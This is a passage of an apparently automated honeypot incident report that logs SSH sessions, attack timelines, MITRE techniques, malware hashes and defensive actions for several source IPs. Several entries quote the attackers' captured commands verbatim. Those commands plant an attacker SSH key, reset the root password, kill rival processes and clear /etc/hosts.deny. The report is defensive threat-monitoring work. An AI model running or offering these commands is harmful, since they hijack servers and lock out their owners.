| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 22:24 |
| **Last Seen** | 2026-04-20 22:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:24:41` | `cowrie.session.connect` |
| `2026-04-20 22:24:41` | `cowrie.client.version` |
| `2026-04-20 22:24:41` | `cowrie.client.kex` |
| `2026-04-20 22:24:43` | `cowrie.login.success` |
| `2026-04-20 22:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8922e631eb54

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:25 |
| **Last Seen** | 2026-04-20 22:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:25:42` | `cowrie.session.connect` |
| `2026-04-20 22:25:42` | `cowrie.client.version` |
| `2026-04-20 22:25:42` | `cowrie.client.kex` |
| `2026-04-20 22:25:43` | `cowrie.login.success` |
| `2026-04-20 22:25:43` | `cowrie.session.params` |
| `2026-04-20 22:25:43` | `cowrie.command.input` |
| `2026-04-20 22:25:43` | `cowrie.command.failed` |
| `2026-04-20 22:25:43` | `cowrie.log.closed` |
| `2026-04-20 22:25:43` | `cowrie.session.params` |
| `2026-04-20 22:25:43` | `cowrie.command.input` |
| `2026-04-20 22:25:43` | `cowrie.session.file_download` |
| `2026-04-20 22:25:43` | `cowrie.log.closed` |
| `2026-04-20 22:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b70efeaa63a0

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:25 |
| **Last Seen** | 2026-04-20 22:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:25:45` | `cowrie.session.connect` |
| `2026-04-20 22:25:45` | `cowrie.client.version` |
| `2026-04-20 22:25:45` | `cowrie.client.kex` |
| `2026-04-20 22:25:46` | `cowrie.login.success` |
| `2026-04-20 22:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb1ab4e03adb

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:30 |
| **Last Seen** | 2026-04-20 22:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:30:20` | `cowrie.session.connect` |
| `2026-04-20 22:30:20` | `cowrie.client.version` |
| `2026-04-20 22:30:20` | `cowrie.client.kex` |
| `2026-04-20 22:30:21` | `cowrie.login.success` |
| `2026-04-20 22:30:21` | `cowrie.session.params` |
| `2026-04-20 22:30:21` | `cowrie.command.input` |
| `2026-04-20 22:30:21` | `cowrie.command.failed` |
| `2026-04-20 22:30:21` | `cowrie.log.closed` |
| `2026-04-20 22:30:21` | `cowrie.session.params` |
| `2026-04-20 22:30:21` | `cowrie.command.input` |
| `2026-04-20 22:30:21` | `cowrie.session.file_download` |
| `2026-04-20 22:30:21` | `cowrie.log.closed` |
| `2026-04-20 22:30:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47073402f041

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:30 |
| **Last Seen** | 2026-04-20 22:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:30:23` | `cowrie.session.connect` |
| `2026-04-20 22:30:23` | `cowrie.client.version` |
| `2026-04-20 22:30:23` | `cowrie.client.kex` |
| `2026-04-20 22:30:24` | `cowrie.login.success` |
| `2026-04-20 22:30:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44a527f50e4d

| Field | Detail |
|---|---|
| **Source IP** | `14.103.46[.]177` |
| **First Seen** | 2026-04-20 22:31 |
| **Last Seen** | 2026-04-20 22:32 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:iox1dJqp2A6i"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:31:35` | `cowrie.session.connect` |
| `2026-04-20 22:31:35` | `cowrie.client.version` |
| `2026-04-20 22:31:35` | `cowrie.client.kex` |
| `2026-04-20 22:31:36` | `cowrie.login.success` |
| `2026-04-20 22:31:36` | `cowrie.session.params` |
| `2026-04-20 22:31:36` | `cowrie.command.input` |
| `2026-04-20 22:31:36` | `cowrie.command.failed` |
| `2026-04-20 22:31:36` | `cowrie.log.closed` |
| `2026-04-20 22:31:39` | `cowrie.session.params` |
| `2026-04-20 22:31:39` | `cowrie.command.input` |
| `2026-04-20 22:31:39` | `cowrie.session.file_download` |
| `2026-04-20 22:31:39` | `cowrie.log.closed` |
| `2026-04-20 22:31:53` | `cowrie.session.params` |
| `2026-04-20 22:31:53` | `cowrie.command.input` |
| `2026-04-20 22:31:53` | `cowrie.log.closed` |
| `2026-04-20 22:31:55` | `cowrie.session.params` |
| `2026-04-20 22:31:55` | `cowrie.command.input` |
| `2026-04-20 22:31:55` | `cowrie.log.closed` |
| `2026-04-20 22:31:55` | `cowrie.session.params` |
| `2026-04-20 22:31:55` | `cowrie.command.input` |
| `2026-04-20 22:32:09` | `cowrie.session.file_download` |
| `2026-04-20 22:32:09` | `cowrie.log.closed` |
| `2026-04-20 22:32:09` | `cowrie.session.params` |
| `2026-04-20 22:32:09` | `cowrie.command.input` |
| `2026-04-20 22:32:09` | `cowrie.command.input` |
| `2026-04-20 22:32:09` | `cowrie.log.closed` |
| `2026-04-20 22:32:10` | `cowrie.session.params` |
| `2026-04-20 22:32:10` | `cowrie.command.input` |
| `2026-04-20 22:32:10` | `cowrie.log.closed` |
| `2026-04-20 22:32:11` | `cowrie.session.params` |
| `2026-04-20 22:32:11` | `cowrie.command.input` |
| `2026-04-20 22:32:11` | `cowrie.log.closed` |
| `2026-04-20 22:32:11` | `cowrie.session.params` |
| `2026-04-20 22:32:11` | `cowrie.command.input` |
| `2026-04-20 22:32:12` | `cowrie.log.closed` |
| `2026-04-20 22:32:12` | `cowrie.session.params` |
| `2026-04-20 22:32:12` | `cowrie.command.input` |
| `2026-04-20 22:32:12` | `cowrie.log.closed` |
| `2026-04-20 22:32:12` | `cowrie.session.params` |
| `2026-04-20 22:32:12` | `cowrie.command.input` |
| `2026-04-20 22:32:12` | `cowrie.log.closed` |
| `2026-04-20 22:32:13` | `cowrie.session.params` |
| `2026-04-20 22:32:13` | `cowrie.command.input` |
| `2026-04-20 22:32:13` | `cowrie.log.closed` |
| `2026-04-20 22:32:13` | `cowrie.session.params` |
| `2026-04-20 22:32:13` | `cowrie.command.input` |
| `2026-04-20 22:32:13` | `cowrie.log.closed` |
| `2026-04-20 22:32:14` | `cowrie.session.params` |
| `2026-04-20 22:32:14` | `cowrie.command.input` |
| `2026-04-20 22:32:14` | `cowrie.log.closed` |
| `2026-04-20 22:32:14` | `cowrie.session.params` |
| `2026-04-20 22:32:14` | `cowrie.command.input` |
| `2026-04-20 22:32:14` | `cowrie.log.closed` |
| `2026-04-20 22:32:15` | `cowrie.session.params` |
| `2026-04-20 22:32:15` | `cowrie.command.input` |
| `2026-04-20 22:32:15` | `cowrie.log.closed` |
| `2026-04-20 22:32:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.46[.]177` to AbuseIPDB if not already reported
- [ ] Block `14.103.46[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1246f1d78aae

| Field | Detail |
|---|---|
| **Source IP** | `115.191.18[.]114` |
| **First Seen** | 2026-04-20 22:32 |
| **Last Seen** | 2026-04-20 22:33 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:tjxn7kLZxgxq"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:32:56` | `cowrie.session.connect` |
| `2026-04-20 22:32:56` | `cowrie.client.version` |
| `2026-04-20 22:32:59` | `cowrie.client.kex` |
| `2026-04-20 22:33:00` | `cowrie.login.success` |
| `2026-04-20 22:33:03` | `cowrie.session.params` |
| `2026-04-20 22:33:03` | `cowrie.command.input` |
| `2026-04-20 22:33:03` | `cowrie.command.failed` |
| `2026-04-20 22:33:04` | `cowrie.log.closed` |
| `2026-04-20 22:33:04` | `cowrie.session.params` |
| `2026-04-20 22:33:04` | `cowrie.command.input` |
| `2026-04-20 22:33:05` | `cowrie.session.file_download` |
| `2026-04-20 22:33:05` | `cowrie.log.closed` |
| `2026-04-20 22:33:26` | `cowrie.session.params` |
| `2026-04-20 22:33:26` | `cowrie.command.input` |
| `2026-04-20 22:33:26` | `cowrie.log.closed` |
| `2026-04-20 22:33:27` | `cowrie.session.params` |
| `2026-04-20 22:33:27` | `cowrie.command.input` |
| `2026-04-20 22:33:29` | `cowrie.log.closed` |
| `2026-04-20 22:33:30` | `cowrie.session.params` |
| `2026-04-20 22:33:30` | `cowrie.command.input` |
| `2026-04-20 22:33:31` | `cowrie.session.file_download` |
| `2026-04-20 22:33:31` | `cowrie.log.closed` |
| `2026-04-20 22:33:32` | `cowrie.session.params` |
| `2026-04-20 22:33:32` | `cowrie.command.input` |
| `2026-04-20 22:33:33` | `cowrie.log.closed` |
| `2026-04-20 22:33:35` | `cowrie.session.params` |
| `2026-04-20 22:33:35` | `cowrie.command.input` |
| `2026-04-20 22:33:36` | `cowrie.log.closed` |
| `2026-04-20 22:33:38` | `cowrie.session.params` |
| `2026-04-20 22:33:38` | `cowrie.command.input` |
| `2026-04-20 22:33:38` | `cowrie.command.input` |
| `2026-04-20 22:33:39` | `cowrie.log.closed` |
| `2026-04-20 22:33:40` | `cowrie.session.params` |
| `2026-04-20 22:33:40` | `cowrie.command.input` |
| `2026-04-20 22:33:40` | `cowrie.log.closed` |
| `2026-04-20 22:33:41` | `cowrie.session.params` |
| `2026-04-20 22:33:41` | `cowrie.command.input` |
| `2026-04-20 22:33:41` | `cowrie.log.closed` |
| `2026-04-20 22:33:42` | `cowrie.session.params` |
| `2026-04-20 22:33:42` | `cowrie.command.input` |
| `2026-04-20 22:33:42` | `cowrie.log.closed` |
| `2026-04-20 22:33:42` | `cowrie.session.params` |
| `2026-04-20 22:33:42` | `cowrie.command.input` |
| `2026-04-20 22:33:42` | `cowrie.log.closed` |
| `2026-04-20 22:33:43` | `cowrie.session.params` |
| `2026-04-20 22:33:43` | `cowrie.command.input` |
| `2026-04-20 22:33:43` | `cowrie.log.closed` |
| `2026-04-20 22:33:43` | `cowrie.session.params` |
| `2026-04-20 22:33:43` | `cowrie.command.input` |
| `2026-04-20 22:33:43` | `cowrie.log.closed` |
| `2026-04-20 22:33:44` | `cowrie.session.params` |
| `2026-04-20 22:33:44` | `cowrie.command.input` |
| `2026-04-20 22:33:44` | `cowrie.log.closed` |
| `2026-04-20 22:33:44` | `cowrie.session.params` |
| `2026-04-20 22:33:44` | `cowrie.command.input` |
| `2026-04-20 22:33:44` | `cowrie.log.closed` |
| `2026-04-20 22:33:45` | `cowrie.session.params` |
| `2026-04-20 22:33:45` | `cowrie.command.input` |
| `2026-04-20 22:33:45` | `cowrie.log.closed` |
| `2026-04-20 22:33:45` | `cowrie.session.params` |
| `2026-04-20 22:33:45` | `cowrie.command.input` |
| `2026-04-20 22:33:45` | `cowrie.log.closed` |
| `2026-04-20 22:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.191.18[.]114` to AbuseIPDB if not already reported
- [ ] Block `115.191.18[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-135bc2747f11

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:38 |
| **Last Seen** | 2026-04-20 22:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:38:14` | `cowrie.session.connect` |
| `2026-04-20 22:38:14` | `cowrie.client.version` |
| `2026-04-20 22:38:14` | `cowrie.client.kex` |
| `2026-04-20 22:38:14` | `cowrie.login.success` |
| `2026-04-20 22:38:14` | `cowrie.session.params` |
| `2026-04-20 22:38:14` | `cowrie.command.input` |
| `2026-04-20 22:38:14` | `cowrie.command.failed` |
| `2026-04-20 22:38:14` | `cowrie.log.closed` |
| `2026-04-20 22:38:15` | `cowrie.session.params` |
| `2026-04-20 22:38:15` | `cowrie.command.input` |
| `2026-04-20 22:38:15` | `cowrie.session.file_download` |
| `2026-04-20 22:38:15` | `cowrie.log.closed` |
| `2026-04-20 22:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5a47e833c6a

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]104` |
| **First Seen** | 2026-04-20 22:38 |
| **Last Seen** | 2026-04-20 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:38:17` | `cowrie.session.connect` |
| `2026-04-20 22:38:17` | `cowrie.client.version` |
| `2026-04-20 22:38:17` | `cowrie.client.kex` |
| `2026-04-20 22:38:17` | `cowrie.login.success` |
| `2026-04-20 22:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]104` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfc4e98559f6

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-04-20 22:40 |
| **Last Seen** | 2026-04-20 22:41 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:EBvGiVM2Xloo"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:40:54` | `cowrie.session.connect` |
| `2026-04-20 22:40:54` | `cowrie.client.version` |
| `2026-04-20 22:40:55` | `cowrie.client.kex` |
| `2026-04-20 22:40:55` | `cowrie.login.success` |
| `2026-04-20 22:40:56` | `cowrie.session.params` |
| `2026-04-20 22:40:56` | `cowrie.command.input` |
| `2026-04-20 22:40:56` | `cowrie.command.failed` |
| `2026-04-20 22:40:56` | `cowrie.log.closed` |
| `2026-04-20 22:40:57` | `cowrie.session.params` |
| `2026-04-20 22:40:57` | `cowrie.command.input` |
| `2026-04-20 22:40:57` | `cowrie.session.file_download` |
| `2026-04-20 22:40:57` | `cowrie.log.closed` |
| `2026-04-20 22:41:09` | `cowrie.session.params` |
| `2026-04-20 22:41:09` | `cowrie.command.input` |
| `2026-04-20 22:41:09` | `cowrie.log.closed` |
| `2026-04-20 22:41:09` | `cowrie.session.params` |
| `2026-04-20 22:41:09` | `cowrie.command.input` |
| `2026-04-20 22:41:10` | `cowrie.log.closed` |
| `2026-04-20 22:41:10` | `cowrie.session.params` |
| `2026-04-20 22:41:10` | `cowrie.command.input` |
| `2026-04-20 22:41:10` | `cowrie.session.file_download` |
| `2026-04-20 22:41:10` | `cowrie.log.closed` |
| `2026-04-20 22:41:11` | `cowrie.session.params` |
| `2026-04-20 22:41:11` | `cowrie.command.input` |
| `2026-04-20 22:41:11` | `cowrie.log.closed` |
| `2026-04-20 22:41:12` | `cowrie.session.params` |
| `2026-04-20 22:41:12` | `cowrie.command.input` |
| `2026-04-20 22:41:12` | `cowrie.log.closed` |
| `2026-04-20 22:41:12` | `cowrie.session.params` |
| `2026-04-20 22:41:12` | `cowrie.command.input` |
| `2026-04-20 22:41:12` | `cowrie.command.input` |
| `2026-04-20 22:41:12` | `cowrie.log.closed` |
| `2026-04-20 22:41:13` | `cowrie.session.params` |
| `2026-04-20 22:41:13` | `cowrie.command.input` |
| `2026-04-20 22:41:13` | `cowrie.log.closed` |
| `2026-04-20 22:41:13` | `cowrie.session.params` |
| `2026-04-20 22:41:13` | `cowrie.command.input` |
| `2026-04-20 22:41:13` | `cowrie.log.closed` |
| `2026-04-20 22:41:14` | `cowrie.session.params` |
| `2026-04-20 22:41:14` | `cowrie.command.input` |
| `2026-04-20 22:41:14` | `cowrie.log.closed` |
| `2026-04-20 22:41:15` | `cowrie.session.params` |
| `2026-04-20 22:41:15` | `cowrie.command.input` |
| `2026-04-20 22:41:15` | `cowrie.log.closed` |
| `2026-04-20 22:41:15` | `cowrie.session.params` |
| `2026-04-20 22:41:15` | `cowrie.command.input` |
| `2026-04-20 22:41:15` | `cowrie.log.closed` |
| `2026-04-20 22:41:16` | `cowrie.session.params` |
| `2026-04-20 22:41:16` | `cowrie.command.input` |
| `2026-04-20 22:41:16` | `cowrie.log.closed` |
| `2026-04-20 22:41:16` | `cowrie.session.params` |
| `2026-04-20 22:41:16` | `cowrie.command.input` |
| `2026-04-20 22:41:16` | `cowrie.log.closed` |
| `2026-04-20 22:41:17` | `cowrie.session.params` |
| `2026-04-20 22:41:17` | `cowrie.command.input` |
| `2026-04-20 22:41:17` | `cowrie.log.closed` |
| `2026-04-20 22:41:18` | `cowrie.session.params` |
| `2026-04-20 22:41:18` | `cowrie.command.input` |
| `2026-04-20 22:41:18` | `cowrie.log.closed` |
| `2026-04-20 22:41:18` | `cowrie.session.params` |
| `2026-04-20 22:41:18` | `cowrie.command.input` |
| `2026-04-20 22:41:18` | `cowrie.log.closed` |
| `2026-04-20 22:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `165.154.6[.]104` | **25** | 2026-04-20 22:02 | 2026-04-20 22:43 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `181.65.191[.]218` | **25** | 2026-04-20 21:44 | 2026-04-20 22:24 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `196.189.237[.]92` | **25** | 2026-04-20 21:01 | 2026-04-20 21:45 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `81.193.216[.]17` | **25** | 2026-04-20 21:02 | 2026-04-20 21:45 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
